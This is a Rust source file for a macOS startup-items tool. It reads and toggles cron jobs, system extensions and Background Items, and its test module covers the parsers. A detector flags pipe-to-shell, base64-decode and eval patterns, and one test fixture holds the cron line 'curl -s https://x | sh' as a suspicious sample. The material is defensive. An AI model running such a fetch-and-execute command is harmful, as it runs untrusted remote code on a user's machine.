//! Other ways things start: the user's cron jobs (switchable here), system
//! extensions (read only; their app or System Settings removes them) and
//! macOS's Background Items list (read with the admin password).

use crate::kit::macos;
use std::path::PathBuf;

// ---------------------------------------------------------------- cron

/// A line we turned off starts with this.
const OFF: &str = "#cmdmeow-off# ";

#[derive(Clone, Debug, PartialEq)]
pub struct CronJob {
    /// The line as cron reads it when on (without our marker).
    pub line: String,
    pub when: String,
    pub command: String,
    pub on: bool,
}

/// "*/5 * * * *" → "every 5 min", "@reboot" → "at startup".
pub fn cron_when(spec: &str) -> String {
    let f: Vec<&str> = spec.split_whitespace().collect();
    let num = |s: &str| s.parse::<u32>().is_ok();
    match f.as_slice() {
        ["@reboot"] => "at startup".into(),
        ["@hourly"] => "every hour".into(),
        ["@daily"] | ["@midnight"] => "every day".into(),
        ["@weekly"] => "every week".into(),
        ["@monthly"] => "every month".into(),
        ["@yearly"] | ["@annually"] => "every year".into(),
        ["*", "*", "*", "*", "*"] => "every minute".into(),
        [m, "*", "*", "*", "*"] if m.starts_with("*/") && num(&m[2..]) => crate::tools::startup::items::every(m[2..].parse::<u64>().unwrap_or(1) * 60),
        [m, "*", "*", "*", "*"] if num(m) => "every hour".into(),
        [m, h, "*", "*", "*"] if num(m) && num(h) => "every day".into(),
        [m, h, "*", "*", d] if num(m) && num(h) && num(d) => "every week".into(),
        _ => "on a schedule".into(),
    }
}

fn is_env(l: &str) -> bool {
    let name: String = l.chars().take_while(|c| c.is_ascii_alphanumeric() || *c == '_').collect();
    !name.is_empty() && !name.chars().next().is_some_and(|c| c.is_ascii_digit()) && l[name.len()..].trim_start().starts_with('=')
}

fn parse_line(l: &str, on: bool) -> Option<CronJob> {
    let t = l.trim();
    if t.is_empty() || t.starts_with('#') || is_env(t) {
        return None;
    }
    let (when, command) = if t.starts_with('@') {
        let (w, c) = t.split_once(char::is_whitespace)?;
        (w.to_string(), c.trim().to_string())
    } else {
        let mut rest = t;
        let mut fields = Vec::new();
        for _ in 0..5 {
            let (w, r) = rest.split_once(char::is_whitespace)?;
            fields.push(w);
            rest = r.trim_start();
        }
        (fields.join(" "), rest.to_string())
    };
    (!command.is_empty()).then(|| CronJob { line: t.to_string(), when: cron_when(&when), command, on })
}

/// The jobs in a crontab, ours-turned-off ones included.
pub fn parse_crontab(text: &str) -> Vec<CronJob> {
    text.lines()
        .filter_map(|l| match l.strip_prefix(OFF) {
            Some(rest) => parse_line(rest, false),
            None => parse_line(l, true),
        })
        .collect()
}

/// The crontab with `line` turned on or off; None if it's not there.
pub fn switch_line(text: &str, line: &str, on: bool) -> Option<String> {
    let mut found = false;
    let out: Vec<String> = text
        .lines()
        .map(|l| {
            if found {
                return l.to_string();
            }
            let bare = l.strip_prefix(OFF).unwrap_or(l);
            if bare.trim() == line {
                found = true;
                if on { bare.to_string() } else { format!("{OFF}{bare}") }
            } else {
                l.to_string()
            }
        })
        .collect();
    found.then(|| out.join("\n") + "\n")
}

impl CronJob {
    /// The program it starts (first word of the command).
    pub fn program(&self) -> PathBuf {
        PathBuf::from(self.command.split_whitespace().next().unwrap_or(""))
    }
    /// A name for the row: the program's file name.
    pub fn name(&self) -> String {
        self.program().file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_else(|| self.command.clone())
    }
    /// What looks wrong: code piped from the web into a shell, decoded
    /// payloads, temp or hidden folders.
    pub fn flags(&self) -> Vec<super::sign::Flag> {
        use super::sign::Flag;
        let c = self.command.to_ascii_lowercase().replace(' ', "");
        let mut out: Vec<Flag> = super::sign::flags("", Some(&self.program()), &self.command.split_whitespace().map(str::to_string).collect::<Vec<_>>(), None);
        let piped = ["|sh", "|bash", "|zsh", "|python", "|perl", "|osascript"].iter().any(|k| c.contains(k));
        if piped || c.contains("base64-d") || c.contains("base64--decode") || c.contains("eval$(") {
            out.push(Flag::InlineCode);
        }
        out.sort();
        out.dedup();
        out
    }
}

/// The user's crontab ("" when there is none).
pub fn read_crontab() -> String {
    std::process::Command::new("/usr/bin/crontab")
        .arg("-l")
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
        .unwrap_or_default()
}

pub fn cron_jobs() -> Vec<CronJob> {
    parse_crontab(&read_crontab())
}

/// Turn one cron job on or off (the crontab is read again first, so a
/// change made meanwhile is kept).
pub fn set_cron(job: &CronJob, on: bool) -> Result<(), String> {
    use std::io::Write;
    let text = read_crontab();
    let new = switch_line(&text, &job.line, on).ok_or("That cron job is gone")?;
    let mut child = std::process::Command::new("/usr/bin/crontab")
        .arg("-")
        .stdin(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .map_err(|e| e.to_string())?;
    child.stdin.take().ok_or("crontab")?.write_all(new.as_bytes()).map_err(|e| e.to_string())?;
    let o = child.wait_with_output().map_err(|e| e.to_string())?;
    if o.status.success() {
        Ok(())
    } else {
        Err(String::from_utf8_lossy(&o.stderr).trim().to_string())
    }
}

// ---------------------------------------------------------------- system extensions

#[derive(Clone, Debug, PartialEq)]
pub struct SysExt {
    pub name: String,
    pub bundle_id: String,
    pub team: String,
    /// "network", "endpoint security", "driver"…
    pub kind: String,
    pub on: bool,
    pub active: bool,
    /// What macOS says, e.g. "activated enabled", "activated waiting for user".
    pub state: String,
}

/// Read `systemextensionsctl list`.
pub fn parse_sysext(out: &str) -> Vec<SysExt> {
    let mut kind = String::new();
    let mut found = Vec::new();
    for l in out.lines() {
        if let Some(k) = l.strip_prefix("--- com.apple.system_extension.") {
            // "driver_extension (Go to 'System Settings > …')" → "driver"
            let id = k.split_whitespace().next().unwrap_or("");
            kind = id.trim_end_matches("_extension").replace('_', " ");
            continue;
        }
        let cols: Vec<&str> = l.split('\t').collect();
        if cols.len() < 6 || cols[0] == "enabled" {
            continue;
        }
        let state = cols[5].trim().trim_start_matches('[').trim_end_matches(']').to_string();
        let bundle_id = cols[3].split(" (").next().unwrap_or("").trim().to_string();
        if bundle_id.is_empty() || state.contains("uninstall") || state.contains("terminated") {
            continue;
        }
        found.push(SysExt { name: cols[4].trim().to_string(), bundle_id, team: cols[2].trim().to_string(), kind: kind.clone(), on: cols[0].trim() == "*", active: cols[1].trim() == "*", state });
    }
    // the same extension can be listed once per version: keep the live one
    let mut out: Vec<SysExt> = Vec::new();
    for e in found {
        match out.iter_mut().find(|x| x.bundle_id == e.bundle_id) {
            Some(x) if !x.active && e.active => *x = e,
            Some(_) => {}
            None => out.push(e),
        }
    }
    out
}

pub fn sysexts() -> Vec<SysExt> {
    std::process::Command::new("/usr/bin/systemextensionsctl").arg("list").output().map(|o| parse_sysext(&String::from_utf8_lossy(&o.stdout))).unwrap_or_default()
}

// ---------------------------------------------------------------- background items

/// One record of macOS's Background Items list (System Settings › Login Items).
#[derive(Clone, Debug, PartialEq, Default)]
pub struct BtmItem {
    pub uid: i64,
    pub name: String,
    pub developer: String,
    pub team: String,
    /// "app", "login item", "agent", "daemon", "legacy agent"…
    pub kind: String,
    pub on: bool,
    pub identifier: String,
    pub bundle_id: String,
    pub path: Option<PathBuf>,
    pub program: Option<PathBuf>,
}

impl BtmItem {
    /// The identifier without its type number ("16.com.x.helper" → "com.x.helper").
    pub fn label(&self) -> &str {
        match self.identifier.split_once('.') {
            Some((n, rest)) if n.chars().all(|c| c.is_ascii_digit() || c == '-') => rest,
            _ => &self.identifier,
        }
    }
}

fn file_url(s: &str) -> Option<PathBuf> {
    let p = s.strip_prefix("file://")?;
    let b = p.as_bytes();
    let mut bytes = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' && i + 2 < b.len() {
            if let Some(v) = std::str::from_utf8(&b[i + 1..i + 3]).ok().and_then(|h| u8::from_str_radix(h, 16).ok()) {
                bytes.push(v);
                i += 3;
                continue;
            }
        }
        bytes.push(b[i]);
        i += 1;
    }
    let out = String::from_utf8_lossy(&bytes).trim_end_matches('/').to_string();
    (!out.is_empty()).then(|| PathBuf::from(out))
}

/// Read `sfltool dumpbtm`.
pub fn parse_btm(out: &str) -> Vec<BtmItem> {
    let text = out.replace('\r', "\n");
    let mut items = Vec::new();
    let mut uid = 0i64;
    let mut cur: Option<BtmItem> = None;
    let mut nested = false;
    for l in text.lines() {
        let t = l.trim();
        if let Some(rest) = t.strip_prefix("Records for UID ") {
            if let Some(i) = cur.take() {
                items.push(i);
            }
            uid = rest.split([' ', ':']).next().and_then(|n| n.parse().ok()).unwrap_or(0);
            continue;
        }
        // "#3:" alone starts a record; "#1: 16.com.x" is a nested list entry
        if t.starts_with('#') && t.ends_with(':') && t[1..t.len() - 1].chars().all(|c| c.is_ascii_digit()) {
            if let Some(i) = cur.take() {
                items.push(i);
            }
            cur = Some(BtmItem { uid, ..Default::default() });
            nested = false;
            continue;
        }
        let Some(item) = cur.as_mut() else { continue };
        let Some((k, v)) = t.split_once(':') else { continue };
        let (k, v) = (k.trim(), v.trim());
        if k.starts_with('#') {
            continue;
        }
        if k == "Embedded Item Identifiers" {
            nested = true;
            continue;
        }
        if nested && !k.contains(' ') && k.starts_with('#') {
            continue;
        }
        match k {
            "Name" => item.name = v.to_string(),
            "Developer Name" => item.developer = v.trim_start_matches("(null)").to_string(),
            "Team Identifier" => item.team = v.trim_start_matches("(null)").to_string(),
            "Type" => item.kind = v.split(" (").next().unwrap_or("").trim().to_string(),
            "Disposition" => item.on = v.trim_start_matches('[').split(']').next().unwrap_or("").split(',').any(|d| d.trim() == "enabled"),
            "Identifier" => item.identifier = v.to_string(),
            "Bundle Identifier" => item.bundle_id = v.to_string(),
            "URL" => item.path = file_url(v),
            "Executable Path" => item.program = (!v.is_empty() && v != "(null)").then(|| PathBuf::from(v)),
            _ => {}
        }
    }
    if let Some(i) = cur.take() {
        items.push(i);
    }
    items.retain(|i| !i.name.is_empty() || !i.identifier.is_empty());
    items
}

/// Everything in the Background Items list, read as root (asks for the password).
pub fn btm_items() -> Result<Vec<BtmItem>, String> {
    let out = macos::run_admin("/usr/bin/sfltool dumpbtm", "Cmd+Meow wants to read the full list of background items.")?;
    Ok(parse_btm(&out))
}

/// The items worth showing: this user's or the system's, not macOS's own,
/// and not already listed as a launchd job or a login app.
pub fn btm_extra(items: &[BtmItem], uid: u32, labels: &[&str], programs: &[PathBuf], apps: &[PathBuf]) -> Vec<BtmItem> {
    let mut out: Vec<BtmItem> = items
        .iter()
        .filter(|i| i.uid == uid as i64 || i.uid < 0 || i.uid == 0)
        .filter(|i| !(i.team.is_empty() && (i.label().starts_with("com.apple.") || i.bundle_id.starts_with("com.apple."))))
        .filter(|i| i.kind != "developer" && !i.kind.is_empty())
        .filter(|i| !labels.contains(&i.label()))
        .filter(|i| i.program.as_ref().is_none_or(|p| !programs.contains(p)))
        .filter(|i| i.path.as_ref().is_none_or(|p| !apps.contains(p)))
        .cloned()
        .collect();
    out.sort_by_key(|i| i.name.to_lowercase());
    out.dedup_by(|a, b| a.identifier == b.identifier && a.name == b.name);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reads_and_switches_cron() {
        let tab = "# m h dom mon dow command\nMAILTO=\"\"\nPATH=/usr/bin:/bin\n*/5 * * * * /usr/local/bin/sync.sh\n#cmdmeow-off# @reboot /Users/a/start.sh --quiet\n0 3 * * * curl -s https://x | sh\n15 9 * * 1 /bin/report\n";
        let js = parse_crontab(tab);
        assert_eq!(js.len(), 4);
        assert_eq!((js[0].when.as_str(), js[0].command.as_str(), js[0].on), ("every 5 min", "/usr/local/bin/sync.sh", true));
        assert_eq!((js[1].when.as_str(), js[1].command.as_str(), js[1].on), ("at startup", "/Users/a/start.sh --quiet", false));
        assert_eq!(js[2].when, "every day");
        assert_eq!(js[3].when, "every week");
        let off = switch_line(tab, &js[0].line, false).unwrap();
        assert!(off.contains("#cmdmeow-off# */5 * * * * /usr/local/bin/sync.sh\n"));
        assert_eq!(parse_crontab(&off)[0].on, false);
        let back = switch_line(&off, &js[0].line, true).unwrap();
        assert_eq!(back, tab);
        let on = switch_line(tab, &js[1].line, true).unwrap();
        assert!(on.contains("\n@reboot /Users/a/start.sh --quiet\n"));
        assert!(switch_line(tab, "nope", true).is_none());
        assert_eq!(cron_when("0 * * * *"), "every hour");
        use crate::tools::startup::sign::Flag;
        assert_eq!(js[2].flags(), vec![Flag::InlineCode]);
        assert!(js[0].flags().is_empty());
        assert_eq!(js[0].name(), "sync.sh");
        let odd = parse_crontab("@reboot /tmp/.x/run\n");
        assert_eq!(odd[0].flags(), vec![Flag::TempFolder, Flag::HiddenFolder]);
        assert_eq!(cron_when("1-5 * * * *"), "on a schedule");
    }

    #[test]
    fn reads_system_extensions() {
        let out = "3 extension(s)\n--- com.apple.system_extension.network_extension\nenabled\tactive\tteamID\tbundleID (version)\tname\t[state]\n*\t*\tVBG97UB4TA\tcom.objective-see.lulu.extension (2.4.1/2.4.1)\tLuLu\t[activated enabled]\n\t\tVBG97UB4TA\tcom.objective-see.lulu.extension (2.3.0/2.3.0)\tLuLu\t[terminated waiting to uninstall on reboot]\n--- com.apple.system_extension.driver_extension (Go to 'System Settings > General > Login Items & Extensions > Driver Extensions' to modify these system extension(s))\nenabled\tactive\tteamID\tbundleID (version)\tname\t[state]\n\t\tABCDE12345\tcom.acme.driver (1.0/1)\tAcme Driver\t[activated waiting for user]\n";
        let x = parse_sysext(out);
        assert_eq!(x.len(), 2);
        assert_eq!((x[0].name.as_str(), x[0].kind.as_str(), x[0].on, x[0].active), ("LuLu", "network", true, true));
        assert_eq!((x[1].kind.as_str(), x[1].on, x[1].state.as_str()), ("driver", false, "activated waiting for user"));
    }

    const BTM: &str = "========================\n Records for UID 501 : 9F0C\n========================\n\n ServiceManagement migrated: true\n\n Items:\n\n #1:\n                 UUID: 2f9\n                 Name: Docker\n       Developer Name: Docker Inc\n      Team Identifier: 9BNSXJN65R\n                 Type: app (0x2)\n                Flags: [  ] (0)\n          Disposition: [enabled, allowed, visible, notified] (0xb)\n           Identifier: 2.com.docker.docker\n                  URL: file:///Applications/Docker.app/\n           Generation: 0\n    Bundle Identifier: com.docker.docker\n    Embedded Item Identifiers:\n        #1: 16.com.docker.helper\n #2:\n                 UUID: 3a\n                 Name: Helper Thing\n       Developer Name: Acme\n      Team Identifier: ACME123456\n                 Type: login item (0x4)\n          Disposition: [disabled, allowed, visible, notified] (0xa)\n           Identifier: 4.com.acme.helper\n                  URL: file:///Applications/Acme%20Tool.app/Contents/Library/LoginItems/Helper.app/\n #3:\n                 Name: com.apple.thing\n       Developer Name: (null)\n      Team Identifier: (null)\n                 Type: legacy daemon (0x10010)\n          Disposition: [enabled, allowed, visible, notified] (0xb)\n           Identifier: 16.com.apple.thing\n      Executable Path: /usr/libexec/thing\n #4:\n                 Name: Updater\n       Developer Name: Google\n      Team Identifier: EQHXZ8M8AV\n                 Type: legacy agent (0x10008)\n          Disposition: [enabled, allowed, visible, notified] (0xb)\n           Identifier: 8.com.google.keystone.agent\n      Executable Path: /Users/a/Library/Google/x\n========================\n Records for UID -2 : FFFF\n========================\n #1:\n                 Name: Daemon Co\n      Team Identifier: DDDD\n                 Type: daemon (0x10)\n          Disposition: [enabled] (0x1)\n           Identifier: 16.com.daemon.co\n";

    #[test]
    fn reads_background_items() {
        let items = parse_btm(&BTM.replace('\n', "\r"));
        assert_eq!(items.len(), 5);
        let d = &items[0];
        assert_eq!((d.uid, d.name.as_str(), d.kind.as_str(), d.on, d.label()), (501, "Docker", "app", true, "com.docker.docker"));
        assert_eq!(d.path, Some(PathBuf::from("/Applications/Docker.app")));
        assert_eq!(items[1].path, Some(PathBuf::from("/Applications/Acme Tool.app/Contents/Library/LoginItems/Helper.app")));
        assert!(!items[1].on && items[1].kind == "login item");
        assert_eq!(items[2].developer, "");
        assert_eq!((items[4].uid, items[4].label()), (-2, "com.daemon.co"));
        // macOS's own, and the ones already shown as jobs or login apps, go
        let extra = btm_extra(&items, 501, &["com.google.keystone.agent"], &[], &[PathBuf::from("/Applications/Docker.app")]);
        let names: Vec<&str> = extra.iter().map(|i| i.name.as_str()).collect();
        assert_eq!(names, vec!["Daemon Co", "Helper Thing"]);
    }
}
